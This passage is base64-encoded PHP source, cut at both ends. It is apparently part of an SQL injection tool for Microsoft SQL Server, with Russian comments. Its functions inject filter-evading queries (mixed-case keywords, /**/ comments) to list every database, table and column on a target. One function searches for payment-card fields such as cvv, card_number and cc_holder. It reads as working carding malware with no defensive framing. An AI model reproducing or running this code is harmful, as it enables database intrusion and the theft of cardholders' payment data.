cHMpCgkJewoJCQkvLyR0aGlzLT5kKCRwcHMsJyRwcHMnKTsKCQkKCQkJJG1haWwgPSAkdGhpcy0+Y2hhcmNoZXJfbXNzcWwoIiUkcHBzJSIpOwoJCQkKCQkJZm9yZWFjaCgkYmRzIGFzICRiZCkKCQkJewoJCQkKCQkJCgkJCQkKCQkJCgkJCQlpZih0cmltKCRiZCkgPT0gJ21hc3RlcicpY29udGludWU7CgkJCQkKCQkJCWlmKHRyaW0oJGJkKSA9PSAndGVtcGRiJyljb250aW51ZTsKCQkJCQoJCQkJaWYodHJpbSgkYmQpID09ICdtb2RlbCcpY29udGludWU7CgkJCQkKCQkJCWlmKHRyaW0oJGJkKSA9PSAnbXNkYicpY29udGludWU7CgkJCQkKCQkJCWlmKHRyaW0oJGJkKSA9PSAnZGlzdHJpYnV0aW9uJyljb250aW51ZTsKCQkJCQoJCQkJaWYodHJpbSgkYmQpID09ICdSZXBvcnRTZXJ2ZXInKWNvbnRpbnVlOwoJCQkJCgkJCQlpZih0cmltKCRiZCkgPT0gJ1JlcG9ydFNlcnZlclRlbXBEQicpY29udGludWU7CgkJCQoJCQkJJHRoaXMtPmQoJGJkLCcjIyMjIyMjIyMjIyMjIyMjIEJEICMjIyMjIyMjIyMjIyMjIyAtICcuJHBwcyk7CgkJCQkKCQkJCQoJCQkJCgkJCQkvLyAvKiovQ09MTEFURSBEQVRBQkFTRV9ERUZBVUxUICAKCQkJCSRjb3VudCA9ICR0aGlzLT5tc3NxbEdldFZhbHVlKCIoLyoqL3NFbEVjVCAvKiovY0FzVChjb3VudCh0Lm5hbWUpIGFzIGNoYXIpIGFzIHggLyoqL2ZSb00gWyIuJGJkLiJdLi5bc3lzb2JqZWN0c10gdCBqb2luIFtzeXNjb2x1bW5zXSBhcyBjIG9uIHQuaWQgPSBjLmlkIC8qKi93SGVSZSB0Lnh0eXBlID0gY2hhcig4NSkgYW5kIGMubmFtZSBsaWtlICRtYWlsKSIpOwoJCQkJCgkJCQkkY291bnQgPSAkY291bnRbIigvKiovc0VsRWNUIC8qKi9jQXNUKGNvdW50KHQubmFtZSkgYXMgY2hhcikgYXMgeCAvKiovZlJvTSBbIi4kYmQuIl0uLltzeXNvYmplY3RzXSB0IGpvaW4gW3N5c2NvbHVtbnNdIGFzIGMgb24gdC5pZCA9IGMuaWQgLyoqL3dIZVJlIHQueHR5cGUgPSBjaGFyKDg1KSBhbmQgYy5uYW1lIGxpa2UgJG1haWwpIl07CgkJCQkKCQkJCWlmKCR0aGlzLT5iYWRfYm9keSA9PSAzMCl7CgkJCQkJJHRoaXMtPmQoJyR0aGlzLT5iYWRfYm9keSA9IDMwJyk7CgkJCQkJcmV0dXJuIGZhbHNlOwoJCQkJfQoJCQkJCgkJCQkKCQkJCWlmKGVtcHR5KCRjb3VudCkpJGNvdW50ID0gMDsKCQkJCWlmKCRjb3VudD09MCl7CgkJCQkJJHRoaXMtPmQoJGJkLCcgQ09OVElOVUUgIC0gJy4kcHBzKTsKCQkJCQljb250aW51ZSAxO30KCQkJCQoJCQkJLy8kY291bnQgPSAkY291bnQrMTsKCQkJCQoJCQkJCgkJCQkKCQkJCQoJCQkJCgkJCQkkdGhpcy0+ZCgkY291bnQsJGJkLictJy4kcHBzKTsKCQkJCQoJCQkJCgkJCQlmb3IgKCRpPTA7JGk8JGNvdW50OyRpKyspCgkJCQl7CgkJCQkJJHRhYmxlID0gJHRoaXMtPm1zc3FsR2V0VmFsdWUoIigvKiovc0VsRWNUIHRvcCAxIHggLyoqL2ZSb00gKC8qKi9zRWxFY1QgLyoqL2RJc1RpTmNUIHRvcCAkaSAodC5uYW1lKSBhcyB4IC8qKi9mUm9NIFsiLiRiZC4iXS4uW3N5c29iamVjdHNdIHQgRlVMTCBPVVRFUiBqb2luIFtzeXNjb2x1bW5zXSBhcyBjIG9uIHQuaWQgPSBjLmlkIC8qKi93SGVSZSB0Lnh0eXBlID0gY2hhcig4NSkgYW5kIGMubmFtZSBsaWtlICRtYWlsIG9yZGVyIGJ5IHggYXNjKSBzcSBvcmRlciBieSB4IGRlc2MpIik7CgkJCQkJCgkJCQkJCgkJCQkJCgkJCQkJCgkJCQkJCgkJCQkJaWYoY291bnQoJHRhYmxlKSAhPTAgQU5EICR0YWJsZSAhPScnKQoJCQkJCXsKCQkJCQkJCgkJCQkJCQoJCQkJCQkkdGFibGVfb25lID0gJHRhYmxlWyIoLyoqL3NFbEVjVCB0b3AgMSB4IC8qKi9mUm9NICgvKiovc0VsRWNUIC8qKi9kSXNUaU5jVCB0b3AgJGkgKHQubmFtZSkgYXMgeCAvKiovZlJvTSBbIi4kYmQuIl0uLltzeXNvYmplY3RzXSB0IEZVTEwgT1VURVIgam9pbiBbc3lzY29sdW1uc10gYXMgYyBvbiB0LmlkID0gYy5pZCAvKiovd0hlUmUgdC54dHlwZSA9IGNoYXIoODUpIGFuZCBjLm5hbWUgbGlrZSAkbWFpbCBvcmRlciBieSB4IGFzYykgc3Egb3JkZXIgYnkgeCBkZXNjKSJdOwoJCQkJCQkKCQkJCQkJCgkJCQkJCSRjb2x1bW4gPSAkdGhpcy0+bXNzcWxHZXRDb2x1bW5Tc24oJGJkLCR0YWJsZV9vbmUsJG1haWwpOwoJCQkJCQkKCQkJCQkJJHRoaXMtPmQoJGNvbHVtbiwkYmQuJzo6OicuJHRhYmxlX29uZSk7CgkJCQkJCQoJCQkJCQlpZihjb3VudCgkY29sdW1uKSAhPTAgQU5EICRjb2x1bW4gIT0nJykKCQkJCQkJewoJCQkJCQkJCgkJCQkJCQkkbXNzcWxbJGJkLic6OjonLiR0YWJsZV9vbmUuJzo6OicuJGNvbHVtbl0gPSAkYmQuJzo6OicuJHRhYmxlX29uZS4nOjo6Jy4kY29sdW1uOwoJCQkJCQkJCQoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQkJLy9icmVhazsKCQkJfQkKCQkJCQoJCX0KCQkkbXNzcWwgID0gYXJyYXlfdW5pcXVlKCRtc3NxbCk7CgkJCgkJLy8kdGhpcy0+ZCgkbXNzcWwsJyRtc3NxbC10YWJsZXMnKTsKCQkKCQlyZXR1cm4gJG1zc3FsOwoJCQoJCQoJCQoJfQoJCglmdW5jdGlvbiBtc3NxbEdldENvbHVtblNzbigkYmQsJHRhYmxlLCRsaWtlKXsvL9Cf0L7QuNGB0Log0LrQvtC70L7QvdC60Lgg0YEgc25uCgkJCgkJCgkJCQoJCSRtYWlsID0gJHRoaXMtPmNoYXJjaGVyX21zc3FsKCIlJGxpa2UlIik7CgkJJHRhYmxlX25ldyA9ICR0aGlzLT5jaGFyY2hlcl9tc3NxbCgkdGFibGUpOwoJCQoJCQoJCSRxcSA9ICR0aGlzLT5tc3NxbEdldFZhbHVlKCIoLyoqL3NFbEVjVCAvKiovZElzVGlOY1QgdG9wIDEgY29sdW1uX25hbWUgZnJvbSAoc2VsZWN0IGRpc3RpbmN0IHRvcCAxIGNvbHVtbl9uYW1lIGZyb20gJGJkLmluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX25hbWUgPXskdGFibGVfbmV3fSBBTkQgY29sdW1uX25hbWUgbGlrZSAkbWFpbCBvcmRlciBCWSBjb2x1bW5fbmFtZSAgQVNDKSBzcSBvcmRlciBCWSBjb2x1bW5fbmFtZSBBU0MpIik7CgkJCgoJCQoJCXJldHVybiAkcXFbIigvKiovc0VsRWNUIC8qKi9kSXNUaU5jVCB0b3AgMSBjb2x1bW5fbmFtZSBmcm9tIChzZWxlY3QgZGlzdGluY3QgdG9wIDEgY29sdW1uX25hbWUgZnJvbSAkYmQuaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZSA9eyR0YWJsZV9uZXd9IEFORCBjb2x1bW5fbmFtZSBsaWtlICRtYWlsIG9yZGVyIEJZIGNvbHVtbl9uYW1lICBBU0MpIHNxIG9yZGVyIEJZIGNvbHVtbl9uYW1lIEFTQykiXTsKCQkKCQkKCQkKCX0KCQoJCglmdW5jdGlvbiBtc3NxbEdldExpa2VPcmRlcnMoKXsvL9C/0L7QuNGB0Log0LLRgdC10YUg0LrQvtC70L7QvdC+0Log0YEg0LrQsNGA0YLQsNC80Lgg0LLQviDQstGB0LXRhSDQkdCUCgkJCgkJLy8kdGhpcy0+bXNzcWxHZXREYXRhYmFzZSgpOwoJCS8vJHRoaXMtPmQoJHRoaXMtPmRhdGFiYXNlLCdkYXRhYmFzZScpOwoJCQoJCS8vJGJkID0gJHRoaXMtPmRhdGFiYXNlOwoJCQoJCQoJCSRiZHMgPSAkdGhpcy0+bXNzcWxHZXRBbGxCZCgpOwoJCQoJCSR0aGlzLT5kKCRiZHMsJyRiZHMgYWxsJyk7CgkJCgkJCgkJaWYoY291bnQoJGJkcyk9PTAgb3IgJGJkcyA9PScnKXJldHVybiBmYWxzZTsKCQkKCQkkcGFzcyA9IGFycmF5KAoJCSdjdnYnLAoJCSdfY2FyZCcsCgkJJ2N2YycsCgkJJ2NhcmRfbnVtJywKCQknY2FyZCBudW0nLAoJCSdjYXJkX2NjdicsCgkJJ2NyZWRpdF9jYXJkJywKCQknY2FyZF9udW1iZXInLAoJCSdjY2NvZGUnLAoJCSdleHBpcmF0aW9uJywKCQknY2FyZF9jY3YnLAoJCSdjY19jb2RlJywKCQknY2NfaG9sZGVyJywKCQknY2NfdHlwZScsCgkJJ2NhcmRfZXhwJywKCQknZXhwX2NhcmQnLAoJCSdleHBfeWVhcicsCgkJJ2NhcmRfZXhwJywKCQknbnVtY2MnLAoJCSdjY251bScsCgkJJ2NjX251bScsCgkJJ2NjIG51bScsCgkJJ251bV9jYycsCgkJJ251bWJlcl9jYycsCgkJJ251bWJlcnNfY2MnLAoJCSdjcmVkaXRjYXJkJwoJCSk7CgkJCgkJJHRoaXMtPmQoJHBhc3MpOwoJCQoJCQoJCWZvcmVhY2ggKCRwYXNzIGFzICRwcHMpCgkJewoJCQkkcHNzID0gdHJpbSgkcHBzKTsKCQkKCQkJJG1haWwgPSAkdGhpcy0+Y2hhcmNoZXJfbXNzcWwoIiUkcHBzJSIpOwoJCQkKCQkJZm9yZWFjaCgkYmRzIGFzICRiZCkKCQkJewoJCQkKCQkJCgkJCQkvLyR0aGlzLT5kKCRiZCwnIyMjIyMjIyMjIyMjIyMjIyBCRCAjIyMjIyMjIyMjIyMjIyMnKTsKCQkJCgkJCQlpZih0cmltKCRiZCkgPT0gJ21hc3RlcicpY29udGludWU7CgkJCQkKCQkJCWlmKHRyaW0oJGJkKSA9PSAndGVtcGRiJyljb250aW51ZTsKCQkJCQoJCQkJaWYodHJpbSgkYmQpID09ICdtb2RlbCcpY29udGludWU7CgkJCQkKCQkJCWlmKHRyaW0oJGJkKSA9PSAnbXNkYicpY29udGludWU7CgkJCQkKCQkJCWlmKHRyaW0oJGJkKSA9PSAnZGlzdHJpYnV0aW9uJyljb250aW51ZTsKCQkJCQoJCQkJaWYodHJpbSgkYmQpID09ICdSZXBvcnRTZXJ2ZXInKWNvbnRpbnVlOwoJCQkJCgkJCQlpZih0cmltKCRiZCkgPT0gJ1JlcG9ydFNlcnZlclRlbXBEQicpY29udGludWU7CgkJCQoJCQkKCQkJCSR0aGlzLT5kKCRiZCwnIyMjIyMjIyMjIyMjIyMjIyBCRCAjIyMjIyMjIyMjIyMjIyMgLSAnLiRwcHMpOwoJCQkJCgkJCQkKCQkJCQoJCQkJLy8gLyoqL0NPTExBVEUgREFUQUJBU0VfREVGQVVMVCAgCgkJCQkkY291bnQgPSAkdGhpcy0+bXNzcWxHZXRWYWx1ZSgiKC8qKi9zRWxFY1QgLyoqL2NBc1QoY291bnQodC5uYW1lKSBhcyBjaGFyKSBhcyB4IC8qKi9mUm9NIFsiLiRiZC4iXS4uW3N5c29iamVjdHNdIHQgam9pbiBbc3lzY29sdW1uc10gYXMgYyBvbiB0LmlkID0gYy5pZCAvKiovd0hlUmUgdC54dHlwZSA9IGNoYXIoODUpIGFuZCBjLm5hbWUgbGlrZSAkbWFpbCkiKTsKCQkJCQoJCQkJJGNvdW50ID0gJGNvdW50WyIoLyoqL3NFbEVjVCAvKiovY0FzVChjb3VudCh0Lm5hbWUpIGFzIGNoYXIpIGFzIHggLyoqL2ZSb00gWyIuJGJkLiJdLi5bc3lzb2JqZWN0c10gdCBqb2luIFtzeXNjb2x1bW5zXSBhcyBjIG9uIHQuaWQgPSBjLmlkIC8qKi93SGVSZSB0Lnh0eXBlID0gY2hhcig4NSkgYW5kIGMubmFtZSBsaWtlICRtYWlsKSJdOwoJCQkJCgkJCQkKCQkJCWlmKCR0aGlzLT5iYWRfYm9keSA9PSAzMCl7CgkJCQkJJHRoaXMtPmQoJyR0aGlzLT5iYWRfYm9keSA9IDMwJyk7CgkJCQkJcmV0dXJuIGZhbHNlOwoJCQkJfQoJCQkJCgkJCQkKCQkJCQlpZihlbXB0eSgkY291bnQpKSRjb3VudCA9IDA7CgkJCQkJaWYoJGNvdW50PT0wKQoJCQkJCXsKCQkJCQkJJHRoaXMtPmQoJGJkLCcgQ09OVElOVUUgIC0gJy4kcHBzKTsKCQkJCQkJY29udGludWUgMTsKCQkJCQl9CgkJCQkKCQkJCQoJCQkJCgkJCQkKCQkJCWZvciAoJGk9MDskaTwkY291bnQ7JGkrKykKCQkJCXsKCQkJCQkkdGFibGUgPSAkdGhpcy0+bXNzcWxHZXRWYWx1ZSgiKC8qKi9zRWxFY1QgdG9wIDEgeCAvKiovZlJvTSAoLyoqL3NFbEVjVCAvKiovZElzVGlOY1QgdG9wICRpICh0Lm5hbWUpIGFzIHggLyoqL2ZSb00gWyIuJGJkLiJdLi5bc3lzb2JqZWN0c10gdCBGVUxMIE9VVEVSIGpvaW4gW3N5c2NvbHVtbnNdIGFzIGMgb24gdC5pZCA9IGMuaWQgLyoqL3dIZVJlIHQueHR5cGUgPSBjaGFyKDg1KSBhbmQgYy5uYW1lIGxpa2UgJG1haWwgb3JkZXIgYnkgeCBhc2MpIHNxIG9yZGVyIGJ5IHggZGVzYykiKTsKCQkJCQkKCQkJCQkKCQkJCQkKCQkJCQkKCQkJCQkKCQkJCQlpZihjb3VudCgkdGFibGUpICE9MCBBTkQgJHRhYmxlICE9JycpCgkJCQkJewoJCQkJCQkKCQkJCQkJCgkJCQkJCSR0YWJsZV9vbmUgPSAkdGFibGVbIigvKiovc0VsRWNUIHRvcCAxIHggLyoqL2ZSb00gKC8qKi9zRWxFY1QgLyoqL2RJc1RpTmNUIHRvcCAkaSAodC5uYW1lKSBhcyB4IC8qKi9mUm9NIFsiLiRiZC4iXS4uW3N5c29iamVjdHNdIHQgRlVMTCBPVVRFUiBqb2luIFtzeXNjb2x1bW5zXSBhcyBjIG9uIHQuaWQgPSBjLmlkIC8qKi93SGVSZSB0Lnh0eXBlID0gY2hhcig4NSkgYW5kIGMubmFtZSBsaWtlICRtYWlsIG9yZGVyIGJ5IHggYXNjKSBzcSBvcmRlciBieSB4IGRlc2MpIl07CgkJCQkJCQoJCQkJCQkKCQkJCQkJJGNvbHVtbiA9ICR0aGlzLT5tc3NxbEdldENvbHVtbk9yc2VycygkYmQsJHRhYmxlX29uZSwkbWFpbCk7CgkJCQkJCQoJCQkJCQkkdGhpcy0+ZCgkY29sdW1uLCRiZC4nOjo6Jy4kdGFibGVfb25lKTsKCQkJCQkJCgkJCQkJCWlmKGNvdW50KCRjb2x1bW4pICE9MCBBTkQgJGNvbHVtbiAhPScnKQoJCQkJCQl7CgkJCQkJCQkKCQkJCQkJCSRtc3NxbFskYmQuJzo6OicuJHRhYmxlX29uZS4nOjo6Jy4kY29sdW1uXSA9ICRiZC4nOjo6Jy4kdGFibGVfb25lLic6OjonLiRjb2x1bW47CgkJCQkJCQkJCgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCQkKCQkJfQoJCQkvL2JyZWFrOwkJCQoJCX0JCQoJCgkJJG1zc3FsICA9IGFycmF5X3VuaXF1ZSgkbXNzcWwpOwoJCQoJCS8vJHRoaXMtPmQoJG1zc3FsLCckbXNzcWwtdGFibGVzJyk7CgkJCgkJcmV0dXJuICRtc3NxbDsKCQkKCQkKCQkKCX0KCQoJZnVuY3Rpb24gbXNzcWxHZXRDb2x1bW5PcnNlcnMoJGJkLCR0YWJsZSwkbGlrZSl7Ly/Qn9C+0LjRgdC6INC60L7Qu9C+0L3QutC4INGBINC60LDRgNGC0L7QuQoJCQoJCQoJCQkKCQkkbWFpbCA9ICR0aGlzLT5jaGFyY2hlcl9tc3NxbCgiJSRsaWtlJSIpOwoJCSR0YWJsZV9uZXcgPSAkdGhpcy0+Y2hhcmNoZXJfbXNzcWwoJHRhYmxlKTsKCQkKCQkKCQkkcXEgPSAkdGhpcy0+bXNzcWxHZXRWYWx1ZSgiKC8qKi9zRWxFY1QgLyoqL2RJc1RpTmNUIHRvcCAxIGNvbHVtbl9uYW1lIGZyb20gKHNlbGVjdCBkaXN0aW5jdCB0b3AgMSBjb2x1bW5fbmFtZSBmcm9tICRiZC5pbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lID17JHRhYmxlX25ld30gQU5EIGNvbHVtbl9uYW1lIGxpa2UgJG1haWwgb3JkZXIgQlkgY29sdW1uX25hbWUgIEFTQykgc3Egb3JkZXIgQlkgY29sdW1uX25hbWUgQVNDKSIpOwoJCQoKCQkKCQlyZXR1cm4gJHFxWyIoLyoqL3NFbEVjVCAvKiovZElzVGlOY1QgdG9wIDEgY29sdW1uX25hbWUgZnJvbSAoc2VsZWN0IGRpc3RpbmN0IHRvcCAxIGNvbHVtbl9uYW1lIGZyb20gJGJkLmluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX25hbWUgPXskdGFibGVfbmV3fSBBTkQgY29sdW1uX25hbWUgbGlrZSAkbWFpbCBvcmRlciBCWSBjb2x1bW5fbmFtZSAgQVNDKSBzcSBvcmRlciBCWSBjb2x1bW5fbmFtZSBBU0MpIl07CgkJCgkJCgkJCgl9CgkKCS8vLy8KCQoJCglmdW5jdGlvbiBtc3NxbEdldENvdW50KCRiZCwkdGFibGUpey8vINC/0L7Qu9GD0YfQtdC90LjQtSDQutC+0LvQuNGH0LXRgdGC0LLQsCDQodCi0KDQntCaINGDINCi0JDQkdCb0JjQptCrINC40Lcg0L7Qv9GA0LXQtNC10LvQtdC90L7QuSDQkdCUCgkJCgkJCgkJJG1zc3FsID0gJHRoaXMtPm1zc3FsR2V0VmFsdWUoIigvKiovc0VsRWNUIHRvcCAxIC8qKi9jQXNUKGNvdW50KCopIGFzIGNoYXIpIC8qKi9mUm9NIFt7JGJkfV0uLlt7JHRhYmxlfV0pIik7CQoJCXJldHVybiAkbXNzcWxbIigvKiovc0VsRWNUIHRvcCAxIC8qKi9jQXNUKGNvdW50KCopIGFzIGNoYXIpIC8qKi9mUm9NIFt7JGJkfV0uLlt7JHRhYmxlfV0pIl07Cgl9CgkKCWZ1bmN0aW9uIG1zc3FsR2V0Q29sdW1ucygkYmQsJHRhYmxlKXsvL9C/0L7Qu9GD0YfQtdC90LjQtSDQstGB0LXRhSDQutC+0LvQvtC90L7QuiDRgyDQutC+0LrRgNC10YLQvdC+0Lkg0JHQlCDQuCDQotCQ0JHQm9CY0KbQqwoJCQoJCSR0YWJsZV9uZXcgPSAkdGhpcy0+Y2hhcmNoZXJfbXNzcWwoJHRhYmxlKTsKCQkJCgkJCgkJJG1zc3FsX2NvdW50ID0gJHRoaXMtPm1zc3FsR2V0VmFsdWUoIigvKiovc0VsRWNUIHRvcCAxIC8qKi9jQXNUKGNvdW50KCopIGFzIGNoYXIpIC8qKi9mUm9NIFskYmRdLi5bc3lzY29sdW1uc10gLyoqL3dIZVJlIGlkPSgvKiovc0VsRWNUIGlkIC8qKi9mUm9NIFskYmRdLi5bc3lzb2JqZWN0c10gLyoqL3dIZVJlIFtuYW1lXT17JHRhYmxlX25ld30pKSIpOwkKCQkKCQkKCQkkY291bnQgPSAkbXNzcWxfY291bnRbIigvKiovc0VsRWNUIHRvcCAxIC8qKi9jQXNUKGNvdW50KCopIGFzIGNoYXIpIC8qKi9mUm9NIFskYmRdLi5bc3lzY29sdW1uc10gLyoqL3dIZVJlIGlkPSgvKiovc0VsRWNUIGlkIC8qKi9mUm9NIFskYmRdLi5bc3lzb2JqZWN0c10gLyoqL3dIZVJlIFtuYW1lXT17JHRhYmxlX25ld30pKSJdOyAKCQkKCQkkdGhpcy0+ZCgkY291bnQsJyRtc3NxbCBjb3VudCB0YWJsZXMhIScpOwoJCQoJCQoJCQoJCQoJCWZvciAoJGk9MDskaTwkY291bnQ7JGkrKykKCQl7CgkJCQoJCQkkcXEgPSAkdGhpcy0+bXNzcWxHZXRWYWx1ZSgiKC8qKi9zRWxFY1QgLyoqL2RJc1RpTmNUIHRvcCAxIC8qKi9jQXNUKFtuYW1lXSBhcyBudmFyY2hhcikgLyoqL2ZSb00gWyRiZF0uLltzeXNjb2x1bW5zXSAvKiovd0hlUmUgaWQ9KC8qKi9zRWxFY1QgaWQgLyoqL2ZSb00gWyRiZF0uLltzeXNvYmplY3RzXSAvKiovd0hlUmUgW25hbWVdPSR0YWJsZV9uZXcpIGFuZCBbbmFtZV0gbm90IGluICgvKiovc0VsRWNUIC8qKi9kSXNUaU5jVCB0b3AgJGkgW25hbWVdIC8qKi9mUm9NIFskYmRdLi5bc3lzY29sdW1uc10gLyoqL3dIZVJlIGlkPSgvKiovc0VsRWNUIHRvcCAxIGlkIC8qKi9mUm9NIFskYmRdLi5bc3lzb2JqZWN0c10gLyoqL3dIZVJlIFtuYW1lXT0kdGFibGVfbmV3KSkpIik7CgkJCQoJCQkkbXNzcWxbXSA9ICRxcVsiKC8qKi9zRWxFY1QgLyoqL2RJc1RpTmNUIHRvcCAxIC8qKi9jQXNUKFtuYW1lXSBhcyBudmFyY2hhcikgLyoqL2ZSb00gWyRiZF0uLltzeXNjb2x1bW5zXSAvKiovd0hlUmUgaWQ9KC8qKi9zRWxFY1QgaWQgLyoqL2ZSb00gWyRiZF0uLltzeXNvYmplY3RzXSAvKiovd0hlUmUgW25hbWVdPSR0YWJsZV9uZXcpIGFuZCBbbmFtZV0gbm90IGluICgvKiovc0VsRWNUIC8qKi9kSXNUaU5jVCB0b3AgJGkgW25hbWVdIC8qKi9mUm9NIFskYmRdLi5bc3lzY29sdW1uc10gLyoqL3dIZVJlIGlkPSgvKiovc0VsRWNUIHRvcCAxIGlkIC8qKi9mUm9NIFskYmRdLi5bc3lzb2JqZWN0c10gLyoqL3dIZVJlIFtuYW1lXT0kdGFibGVfbmV3KSkpIl07CgkJCQoJCX0KCQkKCQkKCQlyZXR1cm4gJG1zc3FsOwoJCQoJCQoJfQoJCglmdW5jdGlvbiBtc3NxbEdldEFsbFRhYmxlcygkYmQpey8v0L/QvtC70YPRh9C10L3QuNC1INCS0KHQldClINCi0JDQkdCb0JjQpiDRgyDQutC+0L3QutGA0LXRgtC90L7QuSDQkdCUCgkJCgkJCgkJCgkJJG1zc3FsID0gJHRoaXMtPm1zc3FsR2V0VmFsdWUoIigvKiovc0VsRWNUIHRvcCAxIC8qKi9jQXNUKGNvdW50KCopIGFzIGNoYXIpIC8qKi9mUm9NIFt7JGJkfV0uLltzeXNvYmplY3RzXSAvKiovd0hlUmUgeHR5cGU9Y2hhcig4NSkpIik7CQoJCSRjb3VudCA9ICAkbXNzcWxbIigvKiovc0VsRWNUIHRvcCAxIC8qKi9jQXNUKGNvdW50KCopIGFzIGNoYXIpIC8qKi9mUm9NIFt7JGJkfV0uLltzeXNvYmplY3RzXSAvKiovd0hlUmUgeHR5cGU9Y2hhcig4NSkpIl07CgkJCgkJCgkJJHRhYmxlID0gJHRoaXMtPm1zc3FsR2V0VmFsdWUoIigvKiovc0VsRWNUIC8qKi9kSXNUaU5jVCB0b3AgMSAvKiovY0FzVChbbmFtZV0gYXMgbnZhcmNoYXIpIC8qKi9mUm9NIFt7JGJkfV0uLltzeXNvYmplY3RzXSAvKiovd0hlUmUgaWQ9KC8qKi9zRWxFY1QgdG9wIDEgaWQgLyoqL2ZSb00gKC8qKi9zRWxFY1QgLyoqL2RJc1RpTmNUIHRvcCAxIGlkIC8qKi9mUm9NIFt7JGJkfV0uLltzeXNvYmplY3RzXSAvKiovd0hlUmUgeHR5cGU9Y2hhcig4NSkgb3JkZXIgQlkgaWQgQVNDKSBzcSBvcmRlciBCWSBpZCBERVNDKSkiKTsKCQkKCQkkdGhpcy0+ZCgkdGFibGUsJyR0YWJsZV9PTkUnKTsKCQkvLyRjb3VudCA9IDU7CgkJCgkKCQkKCQlmb3IgKCRpPTI7JGk8JGNvdW50OyRpKyspCgkJewoJCQkKCQkJJHFxID0gJHRoaXMtPm1zc3FsR2V0VmFsdWUoIigvKiovc0VsRWNUIC8qKi9kSXNUaU5jVCB0b3AgMSAvKiovY0FzVChbbmFtZV0gYXMgbnZhcmNoYXIpIC8qKi9mUm9NIFt7JGJkfV0uLltzeXNvYmplY3RzXSAvKiovd0hlUmUgaWQ9KC8qKi9zRWxFY1QgdG9wIDEgaWQgLyoqL2ZSb00gKC8qKi9zRWxFY1QgLyoqL2RJc1RpTmNUIHRvcCB7JGl9IGlkIC8qKi9mUm9NIFt7JGJkfV0uLltzeXNvYmplY3RzXSAvKiovd0hlUmUgeHR5cGU9Y2hhcig4NSkgb3JkZXIgQlkgaWQgQVNDKSBzcSBvcmRlciBCWSBpZCBERVNDKSkiKTsKCQkJCgkJCSRtc3NxbFtdID0gJHFxWyIoLyoqL3NFbEVjVCAvKiovZElzVGlOY1QgdG9wIDEgLyoqL2NBc1QoW25hbWVdIGFzIG52YXJjaGFyKSAvKiovZlJvTSBbeyRiZH1dLi5bc3lzb2JqZWN0c10gLyoqL3dIZVJlIGlkPSgvKiovc0VsRWNUIHRvcCAxIGlkIC8qKi9mUm9NICgvKiovc0VsRWNUIC8qKi9kSXNUaU5jVCB0b3AgeyRpfSBpZCAvKiovZlJvTSBbeyRiZH1dLi5bc3lzb2JqZWN0c10gLyoqL3dIZVJlIHh0eXBlPWNoYXIoODUpIG9yZGVyIEJZIGlkIEFTQykgc3Egb3JkZXIgQlkgaWQgREVTQykpIl07CgkJCQoJCX0KCQkKCQlyZXR1cm4gJG1zc3FsOwoJCQoJCQoJfQoJCglmdW5jdGlvbiBtc3NxbEdldEFsbEJkKCl7IC8v0L/QvtC70YPRh9C10L3QuNC1INC40LzQtdC9INCy0YHQtdGFINCR0JQgKHN5c2RhdGFiYXNlcyDQsdCw0LfRiyDQtNCw0L3QvdGL0YUpINC40LcgbWFzdGVyCgkKCgkJCgkJCQoJCSRkYXRhID0gJHRoaXMtPm1zc3FsR2V0VmFsdWUoIigvKiovc0VsRWNUIHRvcCAxIC8qKi9jQXNUKGNvdW50KCopIGFzIGNoYXIpIC8qKi9mUm9NIFttYXN0ZXJdLi5bc3lzZGF0YWJhc2VzXSkiKTsKCQkkcmVzID0gJGRhdGFbIigvKiovc0VsRWNUIHRvcCAxIC8qKi9jQXNUKGNvdW50KCopIGFzIGNoYXIpIC8qKi9mUm9NIFttYXN0ZXJdLi5bc3lzZGF0YWJhc2VzXSkiXTsKCQkKCQkkY291bnQgPSAkcmVzOwoJCSR0aGlzLT5kKCRjb3VudCwnbXNzcWxHZXRDb3VudEJkJyk7CgoJCSR0aGlzLT50aW1lYXV0ID0gMjA7CgkJCgkJJHRoaXMtPm1zc3FsR2V0RGF0YWJhc2UoKTsKCQkKCQlpZigkdGhpcy0+ZGF0YWJhc2UgIT0nJykKCQkJewoJCQkJJG1zc3FsW10gPSAkdGhpcy0+ZGF0YWJhc2U7IAoJCgkJCQkkdGhpcy0+ZCgkdGhpcy0+ZGF0YWJhc2UsJyR0aGlzLT5kYXRhYmFzZSBtc3NxbEdldEFsbEJkJyk7CgkJCQoJCQl9CgkJCgkJCgkJZm9yICgkaT0xOyRpPCRjb3VudDskaSsrKQoJCXsKCQkJLy9zZWxlY3QgQUhfTkFNRTEgQ09MTEFURSBEQVRBQkFTRV9ERUZBVUxUIGZyb20gR0dJTUFJTi5TWVNBRE0uQldfQVVGVFJfS09QRgoJCQkvLyRxcSA9ICR0aGlzLT5tc3NxbEdldFZhbHVlKCIoLyoqL3NFbEVjVCAvKiovZElzVGlOY1QgdG9wIDEgLyoqL2NBc1QoW25hbWVdIGFzIG52YXJjaGFyKSAgLyoqL2ZSb00gW21hc3Rlcl0uLltzeXNkYXRhYmFzZXNdIC8qKi93SGVSZSBbZGJpZF09JGkpIik7CgkJCS8vJG1zc3FsW10gPSAkcXFbIigvKiovc0VsRWNUIC8qKi9kSXNUaU5jVCB0b3AgMSAvKiovY0FzVChbbmFtZV0gYXMgbnZhcmNoYXIpIC8qKi9mUm9NIFttYXN0ZXJdLi5bc3lzZGF0YWJhc2VzXSAvKiovd0hlUmUgW2RiaWRdPSRpKSJdOwoJCQkKCQkJJHFxID0gJHRoaXMtPm1zc3FsR2V0VmFsdWUoIigvKiovc0VsRWNUIC8qKi9kSXNUaU5jVCB0b3AgMSAvKiovY0FzVChbbmFtZV0gYXMgbnZhcmNoYXIpIC8qKi9DT0xMQVRFIERBVEFCQVNFX0RFRkFVTFQgIC8qKi9mUm9NIFttYXN0ZXJdLi5bc3lzZGF0YWJhc2VzXSAvKiovd0hlUmUgW2RiaWRdPSRpKSIpOwoJCQkKCQkJJGJkID0gICRxcVsiKC8qKi9zRWxFY1QgLyoqL2RJc1RpTmNUIHRvcCAxIC8qKi9jQXNUKFtuYW1lXSBhcyBudmFyY2hhcikgLyoqL0NPTExBVEUgREFUQUJBU0VfREVGQVVMVCAgLyoqL2ZSb00gW21hc3R